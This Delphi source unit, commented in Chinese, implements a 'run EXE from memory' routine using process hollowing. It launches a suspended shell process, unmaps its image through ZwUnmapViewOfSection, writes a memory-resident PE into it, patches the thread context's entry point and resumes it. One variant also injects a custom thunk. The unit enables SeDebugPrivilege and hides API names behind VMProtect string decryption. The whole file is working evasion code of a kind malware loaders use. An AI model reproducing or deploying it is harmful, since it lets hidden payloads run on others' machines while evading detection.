{ ******************************************************* }
{ *                 从内存中加载并运行exe               * }
{ ******************************************************* }
{ * 参数：                                                }
{ * Buffer: 内存中的exe地址                               }
{ * Len: 内存中exe占用长度                                }
{ * CmdParam: 命令行参数(不包含exe文件名的剩余命令行参数）}
{ * ProcessId: 返回的进程Id                               }
{ * 返回值： 如果成功则返回进程的Handle(ProcessHandle),   }
{            如果失败则返回INVALID_HANDLE_VALUE           }
{ ******************************************************* }

unit PEUnit;

interface

uses Windows, SysUtils, HUtil32, VMProtectSDK, classes,TLHelp32,StrUtils,psapi,ActiveX, ComObj,dialogs,Variants;

function MemExecute(const ABuffer; Len: Integer; CmdParam: string; var ProcessId: Cardinal): Cardinal;
function MemExecute_ex(const ABuffer; Len: Integer; CmdParam: string; var ProcessId: Cardinal; thunk: TMemoryStream): Cardinal;
function MyVirtualAllocEx(hProcess: THandle; lpAddress: Pointer;
  dwSize, flAllocationType: DWORD; flProtect: DWORD): Pointer; stdcall; external 'Kernel32.dll' Name 'VirtualAllocEx';
function CountProcessByName(AFileName: string): Integer;
function CountProcessByNameContent(AFileName: string):Integer;
Function CreateShareMem(pName:Pchar;Size:Cardinal):Cardinal;
Procedure FreeShareMem(hMapFile:Cardinal);
Function ReadShareMem(pName:PChar;var Buffer;Len:Cardinal):Bool;
Function WriteShareMem(pName:PChar;Buffer:Pointer;Len:Cardinal):Bool;
function GetProcessFullFilePathAndName(ProcessID: DWORD): string;
function GetWMIProperty(WMIType, WMIProperty: string): string;
implementation

{.$R ExeShell.res}// 外壳程序模板(98下使用)

type
  TImageSectionHeaders = array[0..0] of TImageSectionHeader;
  PImageSectionHeaders = ^TImageSectionHeaders;


//建立共享内存 参数1：共享内存名 参数2：块大小 返回 句柄
Function CreateShareMem(pName:Pchar;Size:Cardinal):Cardinal;
begin
  Result:=CreateFileMapping($FFFFFFFF,nil,PAGE_READWRITE,0,Size,pName);
end;

//释放共享内存  参数：句柄
Procedure FreeShareMem(hMapFile:Cardinal);
var
  pBuffer:Pointer;
begin
  pBuffer:=MapViewOfFile(hMapFile,FILE_MAP_ALL_ACCESS,0,0,0);
  if pBuffer <> nil then
    UnmapViewOfFile(pBuffer);
  if hMapFile <> 0 then
    CloseHandle(hMapFile);  
end;  
  
  
{读取共享内存数据 
 参数1：共享内存名 
 参数2：存放数据缓存 
 参数3：读取长度 
 返回：成功返回true 
}
Function ReadShareMem(pName:PChar;var Buffer;Len:Cardinal):Bool;
var  
  hMapFile:Cardinal;  
  pBuf:Pointer;  
begin  
  Result:=False;  
  hMapFile:=OpenFileMapping(FILE_MAP_ALL_ACCESS,false,pName);  
  if hMapFile <> 0 then  
    begin  
       pBuf:=MapViewOfFile(hMapFile,FILE_MAP_READ,0,0,0);  
       if pBuf <> nil then  
         begin  
           CopyMemory(@Buffer,pBuf,Len);  
           Result:=True;  
         end;  
       CloseHandle(hMapFile);  
    end;  
end;  
  
  
{写入共享内存 
 参数1：共享内存名 
 参数2：数据指针 
 参数3：长度 
 返回：成功返回true 
}  
Function WriteShareMem(pName:PChar;Buffer:Pointer;Len:Cardinal):Bool;
var  
  hMapFile:Cardinal;  
  pBuf:Pointer;  
begin  
  Result:=False;  
  hMapFile:=OpenFileMapping(FILE_MAP_ALL_ACCESS,false,pName);  
  if hMapFile <> 0 then  
    begin  
       pBuf:=MapViewOfFile(hMapFile,FILE_MAP_WRITE,0,0,0);  
       if pBuf <> nil then  
         begin  
           CopyMemory(pBuf,Buffer,Len);  
           Result:=True;  
         end;  
       CloseHandle(hMapFile);  
    end;  
end;


function GetWMIProperty(WMIType, WMIProperty: string): string;
const
  WbemUser ='';
  WbemPassword ='';
  WbemComputer ='localhost';
var
  FSWbemLocator, FWMIService, FWbemObjectSet, Obj: OleVariant;
  C: Cardinal;
  i,Len:integer;
  tempItem:IEnumVariant;
  count : integer;
  msg : string;
begin
  try
  result := '';
  FSWbemLocator:= CreateOleObject('WbemScripting.SWbemLocator');
  FWMIService := FSWbemLocator.ConnectServer(WbemComputer, 'root\CIMV2', WbemUser, WbemPassword);
  FWbemObjectSet := FWMIService.ExecQuery('Select * from Win32_' + WMIType);
  tempItem := IEnumVariant(IUnknown(FWbemObjectSet._NewEnum));
  Result:='';
  count := 0;
  while (tempItem.Next(1, obj, c) = S_OK) do
  begin
    Obj := Obj.Properties_.Item(WMIProperty, 0).Value;
    if not VarIsNull(obj) then
    begin
      if(count > 0) then
        result := result + ',';
      Result := Result + trim(Obj);
      Inc(count);
    end;
  end;
  except
    On E : Exception do
    begin
       msg := Format('GetWMIProperty Error,WMIType:%s, WMIProperty:%s, Msg:%s',
             [WMIType, WMIProperty, E.Message]);
       ShowMessage(msg);
    end;
  end;
  if(lowercase(result) = 'none') then
    result := '';
end;

function CountProcessByName(AFileName: string):Integer;
var
  ExeFileName: String;
  ContinueLoop: BOOL;
  FSnapshotHandle: THandle;
  FProcessEntry32: TProcessEntry32;
  i: Integer;
begin
  ExeFileName := AFileName;
  i := 0;
  FSnapshotHandle := CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
  FProcessEntry32.dwSize := Sizeof(FProcessEntry32);
  ContinueLoop := Process32First(FSnapshotHandle,FProcessEntry32);
  while integer(ContinueLoop) <> 0 do
    begin
      if ((UpperCase(ExtractFileName(FProcessEntry32.szExeFile)) =
           UpperCase(ExeFileName))
       or (UpperCase(FProcessEntry32.szExeFile) =
           UpperCase(ExeFileName))) then
      begin
      
        i := i + 1;
      end;
      ContinueLoop := Process32Next(FSnapshotHandle,FProcessEntry32);
    end;
    Result := i;
end;

Function AdjustProcessPrivilege(Token_Name: Pchar): Boolean;
var
  Token: Cardinal;  
  TokenPri: TOKEN_PRIVILEGES;
  ProcessDest: int64;
  PreSta: DWORD;
begin
  Result := False;
  if OpenProcessToken(GetCurrentProcess,TOKEN_ADJUST_PRIVILEGES,Token) then 
    begin
      if LookupPrivilegeValue(nil,Token_Name,ProcessDest) then 
        begin
          TokenPri.PrivilegeCount := 1;
          TokenPri.Privileges[0].Attributes := SE_PRIVILEGE_ENABLED;
          TokenPri.Privileges[0].Luid := ProcessDest;
          PreSta := 0;
          if AdjustTokenPrivileges(Token,False,TokenPri,sizeof(TokenPri),nil,PreSta) then 
            begin
              Result := True;
            end;
        end;
    end;
end;

function GetProcessFullFilePathAndName(ProcessID: DWORD): string;
var
     Hand: THandle;
     ModName: Array[0..Max_Path-1] of Char;
     hMod: HModule;
     n: DWORD;
begin
     Result:='';
     Hand:=OpenProcess(PROCESS_QUERY_INFORMATION or PROCESS_VM_READ,
                           False,
                           ProcessID);
     if Hand > 0 then
     try
       ENumProcessModules(Hand,@hMod,Sizeof(hMod),n);
       if GetModuleFileNameEx(Hand,hMod,ModName,Sizeof(ModName))>0 then
       begin
         //OutPutDebugString(pchar('已发现ModName:'+ModName));
         Result:=ModName;
       end;
     except
     end;
end;

function CountProcessByNameContent(AFileName: string):Integer;//进行文件尾部字节比对
var
  ExeFileName: String;
  ContinueLoop: BOOL;
  FSnapshotHandle: THandle;
  FProcessEntry32: TProcessEntry32;
  i: Integer;
  fhandle: Integer;
  fhandle2: Integer;
  fByteArr: array[0..254] of byte;
  fByteArr2: array[0..254] of byte;
begin


  ExeFileName := AFileName;
  i := 0;
  AdjustProcessPrivilege('SeDebugPrivilege');
  FSnapshotHandle := CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
  FProcessEntry32.dwSize := Sizeof(FProcessEntry32);
  ContinueLoop := Process32First(FSnapshotHandle,FProcessEntry32);

  fHandle := 0;
  fhandle := FileOpen(AFileName, FmOpenRead or fmShareDenyNone);
  if fhandle > 0 then begin
        FileSeek(fhandle, -255, 2); //2表示从文件末尾，向前移动 iChkByteSize字节，文件尾部读取iChkByteSize数据做校验
        FileRead(fhandle, fByteArr, 255);//读取 iChkByteSize字节 到fByteArr
        FileClose(fhandle);
  end;  //读取自己本身尾部8K字节做校验


  while integer(ContinueLoop) <> 0 do
    begin
      if uppercase(RightStr(FProcessEntry32.szExeFile,4))='.EXE' then
      begin
        if GetProcessFullFilePathAndName(FProcessEntry32.th32ProcessID)<>'' then
        begin
          fHandle2 := 0;
          fHandle2 := FileOpen(GetProcessFullFilePathAndName(FProcessEntry32.th32ProcessID),FmOpenRead or fmShareDenyNone);
          if Fhandle2 >0 then
          begin
              FileSeek(fhandle2, -255, 2); //2表示从文件末尾，向前移动iChkByteSize字节，文件尾部读取iChkByteSize数据做校验
              FileRead(fhandle2, fByteArr2, 255);//读取 iChkByteSize字节 到fByteArr2
              FileClose(fhandle2);
              if CompareMem(@fByteArr, @fByteArr2, 255) then
              begin
                i := i + 1;
              end;
          end;
        end;
      end;
      ContinueLoop := Process32Next(FSnapshotHandle,FProcessEntry32);
    end;

    Result := i;
end;

  { 计算对齐后的大小 }

function GetAlignedSize(Origin, Alignment: Cardinal): Cardinal;
begin
  Result := (Origin + Alignment - 1) div Alignment * Alignment;
end;

{ 计算加载pe并对齐需要占用多少内存，未直接使用OptionalHeader.SizeOfImage作为结果是因为据说有的编译器生成的exe这个值会填0 }

function CalcTotalImageSize(MzH: PImageDosHeader; FileLen: Cardinal; peH: PImageNtHeaders;
  peSecH: PImageSectionHeaders): Cardinal;
var
  i: Integer;
begin
  {计算pe头的大小}
  Result := GetAlignedSize(peH.OptionalHeader.SizeOfHeaders, peH.OptionalHeader.SectionAlignment);

  {计算所有节的大小}
  for i := 0 to peH.FileHeader.NumberOfSections - 1 do
    if peSecH[i].PointerToRawData + peSecH[i].SizeOfRawData > FileLen then {// 超出文件范围}  begin
      Result := 0;
      exit;
    end
    else if peSecH[i].VirtualAddress <> 0 then //计算对齐后某节的大小
      if peSecH[i].Misc.VirtualSize <> 0 then
        Result := GetAlignedSize(peSecH[i].VirtualAddress + peSecH[i].Misc.VirtualSize, peH.OptionalHeader.SectionAlignment)
      else
        Result := GetAlignedSize(peSecH[i].VirtualAddress + peSecH[i].SizeOfRawData, peH.OptionalHeader.SectionAlignment)
    else if peSecH[i].Misc.VirtualSize < peSecH[i].SizeOfRawData then
      Result := Result + GetAlignedSize(peSecH[i].SizeOfRawData, peH.OptionalHeader.SectionAlignment)
    else
      Result := Result + GetAlignedSize(peSecH[i].Misc.VirtualSize, peH.OptionalHeader.SectionAlignment);

end;
{ 加载pe到内存并对齐所有节 }

function AlignPEToMem(const Buf; Len: Integer; var peH: PImageNtHeaders;
  var peSecH: PImageSectionHeaders; var Mem: Pointer; var ImageSize: Cardinal): Boolean;
var
  SrcMz: PImageDosHeader; // DOS头
  SrcPeH: PImageNtHeaders; // PE头
  SrcPeSecH: PImageSectionHeaders; // 节表
  i: Integer;
  l: Cardinal;
  Pt: Pointer;
begin
  Result := false;
  SrcMz := @Buf;
  if Len < sizeof(TImageDosHeader) then exit;
  if SrcMz.e_magic <> IMAGE_DOS_SIGNATURE then exit;
  if Len < SrcMz._lfanew + sizeof(TImageNtHeaders) then exit;
  SrcPeH := Pointer(Integer(SrcMz) + SrcMz._lfanew);
  if (SrcPeH.Signature <> IMAGE_NT_SIGNATURE) then exit;
  if (SrcPeH.FileHeader.Characteristics and IMAGE_FILE_DLL <> 0) or
    (SrcPeH.FileHeader.Characteristics and IMAGE_FILE_EXECUTABLE_IMAGE = 0)
    or (SrcPeH.FileHeader.SizeOfOptionalHeader <> sizeof(TImageOptionalHeader)) then exit;
  SrcPeSecH := Pointer(Integer(SrcPeH) + sizeof(TImageNtHeaders));
  ImageSize := CalcTotalImageSize(SrcMz, Len, SrcPeH, SrcPeSecH);
  if ImageSize = 0 then
    exit;
  Mem := VirtualAlloc(nil, ImageSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE); // 分配内存
  if Mem <> nil then begin
    // 计算需要复制的PE头字节数
    l := SrcPeH.OptionalHeader.SizeOfHeaders;
    for i := 0 to SrcPeH.FileHeader.NumberOfSections - 1 do
      if (SrcPeSecH[i].PointerToRawData <> 0) and (SrcPeSecH[i].PointerToRawData < l) then
        l := SrcPeSecH[i].PointerToRawData;
    Move(SrcMz^, Mem^, l);
    peH := Pointer(Integer(Mem) + PImageDosHeader(Mem)._lfanew);
    peSecH := Pointer(Integer(peH) + sizeof(TImageNtHeaders));

    Pt := Pointer(Cardinal(Mem) + GetAlignedSize(peH.OptionalHeader.SizeOfHeaders, peH.OptionalHeader.SectionAlignment));
    for i := 0 to peH.FileHeader.NumberOfSections - 1 do begin
      // 定位该节在内存中的位置
      if peSecH[i].VirtualAddress <> 0 then
        Pt := Pointer(Cardinal(Mem) + peSecH[i].VirtualAddress);

      if peSecH[i].SizeOfRawData <> 0 then begin
        // 复制数据到内存
        Move(Pointer(Cardinal(SrcMz) + peSecH[i].PointerToRawData)^, Pt^, peSecH[i].SizeOfRawData);
        if peSecH[i].Misc.VirtualSize < peSecH[i].SizeOfRawData then
          Pt := Pointer(Cardinal(Pt) + GetAlignedSize(peSecH[i].SizeOfRawData, peH.OptionalHeader.SectionAlignment))
        else
          Pt := Pointer(Cardinal(Pt) + GetAlignedSize(peSecH[i].Misc.VirtualSize, peH.OptionalHeader.SectionAlignment));
        // pt 定位到下一节开始位置
      end
      else
        Pt := Pointer(Cardinal(Pt) + GetAlignedSize(peSecH[i].Misc.VirtualSize, peH.OptionalHeader.SectionAlignment));
    end;
    Result := True;
  end;
end;

{type
  TVirtualAllocEx = function(hProcess: THandle; lpAddress: Pointer;
    dwSize, flAllocationType: DWORD; flProtect: DWORD): Pointer; stdcall;

var
  MyVirtualAllocEx          : TVirtualAllocEx = nil;}

{function IsNT: Boolean;
begin
  Result := Assigned(MyVirtualAllocEx);
end;}

{ 生成外壳程序命令行 }

function PrepareShellExe(CmdParam: string; BaseAddr, ImageSize: Cardinal): string;
var
  r, h, sz: Cardinal;
  p: Pointer;
  fid, l: Integer;
  Buf: Pointer;
  peH: PImageNtHeaders;
  peSecH: PImageSectionHeaders;
begin
  //if IsNT then begin
    { NT 系统下直接使用自身程序作为外壳进程 }
  if CmdParam <> '' then
    Result := format('"%s" %s', [ParamStr(0), CmdParam])
  else
    Result := format('"%s"', [ParamStr(0)]);
  //end else begin
    // 由于98系统下无法重新分配外壳进程占用内存,所以必须保证运行的外壳程序能容纳目标进程并且加载地址一致
    // 此处使用的方法是从资源中释放出一个事先建立好的外壳程序,然后通过修改其PE头使其运行时能加载到指定地址并至少能容纳目标进程
    (*
    r := FindResource(HInstance, VMProtectDecryptStringA('SHELL_EXE'), RT_RCDATA);
    h := LoadResource(HInstance, r);
    p := LockResource(h);
    l := SizeOfResource(HInstance, r);
    GetMem(Buf, l);
    Move(p^, Buf^, l);                  // 读到内存
    FreeResource(h);
    peH := Pointer(Integer(Buf) + PImageDosHeader(Buf)._lfanew);
    peSecH := Pointer(Integer(peH) + sizeof(TImageNtHeaders));
    peH.OptionalHeader.ImageBase := BaseAddr; // 修改PE头重的加载基址
    if peH.OptionalHeader.SizeOfImage < ImageSize then {// 目标比外壳大,修改外壳程序运行时占用的内存} begin
      sz := ImageSize - peH.OptionalHeader.SizeOfImage;
      Inc(peH.OptionalHeader.SizeOfImage, sz); // 调整总占用内存数
      Inc(peSecH[peH.FileHeader.NumberOfSections - 1].Misc.VirtualSize, sz); // 调整最后一节占用内存数
    end;

    // 生成外壳程序文件名, 为本程序改后缀名得到的
    // 由于不想 uses SysUtils (一旦 use 了程序将增大80K左右), 而且偷懒，所以只支持最多运行11个进程，后缀名为.dat, .da0~.da9
    Result := ParamStr(0);
    Result := copy(Result, 1, length(Result) - 4) + '.dat';
    r := 0;
    while r < 10 do begin
      fid := CreateFile(pchar(Result), GENERIC_READ or GENERIC_WRITE, 0, nil, Create_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
      if fid < 0 then begin
        Result := copy(Result, 1, length(Result) - 3) + 'da' + Char(r + Byte('0'));
        Inc(r);
      end
      else begin
        //SetFilePointer(fid, Imagesize, nil, 0);
        //SetEndOfFile(fid);
        //SetFilePointer(fid, 0, nil, 0);
        WriteFile(fid, Buf^, l, h, nil); // 写入文件
        CloseHandle(fid);
        break;
      end;
    end;
    if CmdParam <> '' then
      Result := format('"%s" %s', [Result, CmdParam])
    else
      Result := format('"%s"', [Result]);
    FreeMem(Buf);
    *)
  //end;
end;

{是否包含可重定向列表}

function HasRelocationTable(peH: PImageNtHeaders): Boolean;
begin
  Result := (peH.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress <> 0)
    and (peH.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size <> 0);
end;

type
  PImageBaseRelocation = ^TImageBaseRelocation;
  TImageBaseRelocation = packed record
    VirtualAddress: Cardinal;
    SizeOfBlock: Cardinal;
  end;

  { 重定向PE用到的地址 }

procedure DoRelocation(peH: PImageNtHeaders; OldBase, NewBase: Pointer);
var
  Delta: Cardinal;
  p: PImageBaseRelocation;
  pw: PWord;
  i: Integer;
begin
  Delta := Cardinal(NewBase) - peH.OptionalHeader.ImageBase;
  p := Pointer(Cardinal(OldBase) + peH.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
  while (p.VirtualAddress + p.SizeOfBlock <> 0) do begin
    pw := Pointer(Integer(p) + sizeof(p^));
    for i := 1 to (p.SizeOfBlock - sizeof(p^)) div 2 do begin
      if pw^ and $F000 = $3000 then
        Inc(PCardinal(Cardinal(OldBase) + p.VirtualAddress + (pw^ and $0FFF))^, Delta);
      Inc(pw);
    end;
    p := Pointer(pw);
  end;
end;

type
  TZwUnmapViewOfSection = function(Handle, BaseAdr: Cardinal): Cardinal; stdcall;

  { 卸载原外壳占用内存 }

function UnloadShell(ProcHnd, BaseAddr: Cardinal): Boolean;
var
  M: HModule;
  ZwUnmapViewOfSection: TZwUnmapViewOfSection;
begin
  Result := false;
  M := LoadLibrary(VMProtectDecryptStringA('ntdll.dll'));
  if M <> 0 then begin
    //ZwUnmapViewOfSection := MyGetProcAddress(M, VMProtectDecryptStringA('ZwUnmapViewOfSection'));
    ZwUnmapViewOfSection := GetProcAddress(M, VMProtectDecryptStringA('ZwUnmapViewOfSection'));
    if Assigned(ZwUnmapViewOfSection) then
      Result := (ZwUnmapViewOfSection(ProcHnd, BaseAddr) = 0);
    FreeLibrary(M);
  end;
end;

{ 创建外壳进程并获取其基址、大小和当前运行状态 }

function CreateChild(Cmd: string; var Ctx: TContext; var ProcHnd, ThrdHnd, ProcId, BaseAddr, ImageSize: Cardinal): Boolean;
var
  si: TStartUpInfo;
  pi: TProcessInformation;
  Old: Cardinal;
  MemInfo: TMemoryBasicInformation;
  p: Pointer;
begin
  FillChar(si, sizeof(si), 0);
  FillChar(pi, sizeof(pi), 0);
  si.cb := sizeof(si);
  Result := CreateProcess(nil, pchar(Cmd), nil, nil, false, Create_SUSPENDED, nil, nil, si, pi); // 以挂起方式运行进程
  if Result then begin
    ProcHnd := pi.hProcess;
    ThrdHnd := pi.hThread;
    ProcId := pi.dwProcessId;

    { 获取外壳进程运行状态，[ctx.Ebx+8]内存处存的是外壳进程的加载基址，ctx.Eax存放有外壳进程的入口地址 }
    Ctx.ContextFlags := CONTEXT_FULL;
    GetThreadContext(ThrdHnd, Ctx);
    ReadProcessMemory(ProcHnd, Pointer(Ctx.Ebx + 8), @BaseAddr, sizeof(Cardinal), Old); // 读取加载基址
    p := Pointer(BaseAddr);

    { 计算外壳进程占有的内存 }
    while VirtualQueryEx(ProcHnd, p, MemInfo, sizeof(MemInfo)) <> 0 do begin
      if MemInfo.State = MEM_FREE then
        break;
      p := Pointer(Cardinal(p) + MemInfo.RegionSize);
    end;
    ImageSize := Cardinal(p) - Cardinal(BaseAddr);
  end;
end;

{ 创建外壳进程并用目标进程替换它然后执行 }

function AttachPE(CmdParam: string; peH: PImageNtHeaders; peSecH: PImageSectionHeaders;
  Ptr: Pointer; ImageSize: Cardinal; var ProcId: Cardinal): Cardinal;
var
  s: string;
  Addr, Size: Cardinal;
  Ctx: TContext;
  Old: Cardinal;
  p: Pointer;
  Thrd: Cardinal;
begin
  Result := INVALID_HANDLE_VALUE;
  s := PrepareShellExe(CmdParam, peH.OptionalHeader.ImageBase, ImageSize);
  if CreateChild(s, Ctx, Result, Thrd, ProcId, Addr, Size) then begin
    p := nil;
    if (peH.OptionalHeader.ImageBase = Addr) and (Size >= ImageSize) then {// 外壳进程可以容纳目标进程并且加载地址一致}  begin
      p := Pointer(Addr);
      VirtualProtectEx(Result, p, Size, PAGE_EXECUTE_READWRITE, Old);
    end
    else {if IsNT then}  begin // 98 下失败
      if UnloadShell(Result, Addr) then // 卸载外壳进程占有内存
        // 重新按目标进程加载基址和大小分配内存
        p := MyVirtualAllocEx(Result, Pointer(peH.OptionalHeader.ImageBase), ImageSize, MEM_RESERVE or MEM_COMMIT, PAGE_EXECUTE_READWRITE);
      if (p = nil) and HasRelocationTable(peH) then {// 分配内存失败并且目标进程支持重定向}  begin
        // 按任意基址分配内存
        p := MyVirtualAllocEx(Result, nil, ImageSize, MEM_RESERVE or MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        if p <> nil then
          DoRelocation(peH, Ptr, p); // 重定向
      end;
    end;
    if p <> nil then begin
      WriteProcessMemory(Result, Pointer(Ctx.Ebx + 8), @p, sizeof(DWORD), Old); // 重置目标进程运行环境中的基址
      peH.OptionalHeader.ImageBase := Cardinal(p);
      if WriteProcessMemory(Result, p, Ptr, ImageSize, Old) then {// 复制PE数据到目标进程}  begin
        Ctx.ContextFlags := CONTEXT_FULL;
        if Cardinal(p) = Addr then
          Ctx.Eax := peH.OptionalHeader.ImageBase + peH.OptionalHeader.AddressOfEntryPoint // 重置运行环境中的入口地址
        else
          Ctx.Eax := Cardinal(p) + peH.OptionalHeader.AddressOfEntryPoint;
        SetThreadContext(Thrd, Ctx); // 更新运行环境
        ResumeThread(Thrd); // 执行
        CloseHandle(Thrd);
      end
      else begin // 加载失败,杀掉外壳进程
        TerminateProcess(Result, 0);
        CloseHandle(Thrd);
        CloseHandle(Result);
        Result := INVALID_HANDLE_VALUE;
      end;
    end
    else begin // 加载失败,杀掉外壳进程
      TerminateProcess(Result, 0);
      CloseHandle(Thrd);
      CloseHandle(Result);
      Result := INVALID_HANDLE_VALUE;
    end;
  end;
end;

function MemExecute(const ABuffer; Len: Integer; CmdParam: string; var ProcessId: Cardinal): Cardinal;
var
  peH: PImageNtHeaders;
  peSecH: PImageSectionHeaders;
  Ptr: Pointer;
  peSz: Cardinal;
begin
  Result := INVALID_HANDLE_VALUE;
  if AlignPEToMem(ABuffer, Len, peH, peSecH, Ptr, peSz) then begin
    Result := AttachPE(CmdParam, peH, peSecH, Ptr, peSz, ProcessId);
    VirtualFree(Ptr, peSz, MEM_DECOMMIT);
    //VirtualFree(Ptr, 0, MEM_RELEASE);
  end;
end;

function AttachPE_ex(CmdParam: string; peH: PImageNtHeaders; peSecH: PImageSectionHeaders;
  Ptr: Pointer; ImageSize: Cardinal; var ProcId: Cardinal; thunk: TMemoryStream): Cardinal;
var
  s: string;
  Addr, Size: Cardinal;
  Ctx: TContext;
  Old: Cardinal;
  p: Pointer;
  Thrd: Cardinal;

//  thunk: TMemoryStream;
  entry: Cardinal;
begin
  Result := INVALID_HANDLE_VALUE;
  s := PrepareShellExe(CmdParam, peH.OptionalHeader.ImageBase, ImageSize);
  if CreateChild(s, Ctx, Result, Thrd, ProcId, Addr, Size) then begin
    p := nil;
    if (peH.OptionalHeader.ImageBase = Addr) and (Size >= ImageSize) then {// 外壳进程可以容纳目标进程并且加载地址一致}  begin
      p := Pointer(Addr);
      VirtualProtectEx(Result, p, Size, PAGE_EXECUTE_READWRITE, Old);
    end
    else {if IsNT then}  begin // 98 下失败
      if UnloadShell(Result, Addr) then // 卸载外壳进程占有内存
        // 重新按目标进程加载基址和大小分配内存
        p := MyVirtualAllocEx(Result, Pointer(peH.OptionalHeader.ImageBase), ImageSize, MEM_RESERVE or MEM_COMMIT, PAGE_EXECUTE_READWRITE);
      if (p = nil) and HasRelocationTable(peH) then {// 分配内存失败并且目标进程支持重定向}  begin
        // 按任意基址分配内存
        p := MyVirtualAllocEx(Result, nil, ImageSize, MEM_RESERVE or MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        if p <> nil then
          DoRelocation(peH, Ptr, p); // 重定向
      end;
    end;
    if p <> nil then begin
      WriteProcessMemory(Result, Pointer(Ctx.Ebx + 8), @p, sizeof(DWORD), Old); // 重置目标进程运行环境中的基址
      peH.OptionalHeader.ImageBase := Cardinal(p);
      if WriteProcessMemory(Result, p, Ptr, ImageSize, Old) then {// 复制PE数据到目标进程}  begin

        if Cardinal(p) = Addr then
          entry := peH.OptionalHeader.ImageBase + peH.OptionalHeader.AddressOfEntryPoint // 重置运行环境中的入口地址
        else
          entry := Cardinal(p) + peH.OptionalHeader.AddressOfEntryPoint;

        thunk.Position := 1;
        thunk.Write(entry, 4);
        thunk.Position := 0;
        p := MyVirtualAllocEx(Result, nil, thunk.Size, MEM_RESERVE or MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        if p <> nil then
        begin
          WriteProcessMemory(Result, p, Pointer(thunk.Memory), thunk.Size, Old); // 重置目标进程运行环境中的基址
        end;
        Ctx.Eax := Cardinal(p) + 6;

        Ctx.ContextFlags := CONTEXT_FULL;

        SetThreadContext(Thrd, Ctx); // 更新运行环境
        ResumeThread(Thrd); // 执行
        CloseHandle(Thrd);
      end
      else begin // 加载失败,杀掉外壳进程
        TerminateProcess(Result, 0);
        CloseHandle(Thrd);
        CloseHandle(Result);
        Result := INVALID_HANDLE_VALUE;
      end;
    end
    else begin // 加载失败,杀掉外壳进程
      TerminateProcess(Result, 0);
      CloseHandle(Thrd);
      CloseHandle(Result);
      Result := INVALID_HANDLE_VALUE;
    end;
  end;
end;

function MemExecute_ex(const ABuffer; Len: Integer; CmdParam: string; var ProcessId: Cardinal; thunk: TMemoryStream): Cardinal;
var
  peH: PImageNtHeaders;
  peSecH: PImageSectionHeaders;
  Ptr: Pointer;
  peSz: Cardinal;
begin
  Result := INVALID_HANDLE_VALUE;
  if AlignPEToMem(ABuffer, Len, peH, peSecH, Ptr, peSz) then begin
    Result := AttachPE_ex(CmdParam, peH, peSecH, Ptr, peSz, ProcessId, thunk);
    VirtualFree(Ptr, peSz, MEM_DECOMMIT);
    //VirtualFree(Ptr, 0, MEM_RELEASE);
  end;
end;

//initialization
  //MyVirtualAllocEx := MyGetProcAddress(GetModuleHandle(VMProtectDecryptStringA('Kernel32.dll')), VMProtectDecryptStringA('VirtualAllocEx'));

end.
